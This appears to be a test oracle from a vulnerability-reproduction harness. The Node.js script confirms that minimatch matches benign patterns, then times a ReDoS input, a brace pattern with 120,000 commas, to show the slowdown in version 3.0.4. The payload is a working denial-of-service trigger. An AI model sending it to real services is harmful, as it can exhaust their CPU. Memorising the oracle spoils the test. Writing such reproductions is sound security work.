let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const minimatch = require('minimatch');

  // Benign operation must succeed first.
  const benignA = minimatch('file.js', '*.js') === true;
  const benignB = minimatch('file.txt', '*.js') === false;
  if (!benignA || !benignB) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_operation_failed';
    finish();
  } else {
    operation_completed = true;

    // ReDoS trigger used in minimatch CVE context: many comma elements in braces.
    // Keep bounded to complete in a few seconds.
    const commas = 120000;
    const pattern = '{' + ','.repeat(commas) + '}';
    const target = 'x';

    let threw = false;
    let result;
    const t0 = process.hrtime.bigint();
    try {
      result = minimatch(target, pattern);
    } catch (err) {
      threw = true;
      result = 'threw';
    }
    const elapsedMs = Number(process.hrtime.bigint() - t0) / 1e6;

    // Version 3.0.4 should be much slower than patched lines for this input shape.
    const thresholdMs = 800;

    if (threw) {
      exploit_succeeded = false;
      evidence = 'malicious_call_threw;elapsed_ms=' + elapsedMs.toFixed(3) + ';commas=' + commas;
    } else {
      exploit_succeeded = elapsedMs > thresholdMs;
      evidence = 'elapsed_ms=' + elapsedMs.toFixed(3) + ';threshold_ms=' + thresholdMs + ';commas=' + commas + ';result=' + String(result);
    }

    finish();
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_module_failure:' + (e && e.message ? e.message : String(e));
  finish();
}
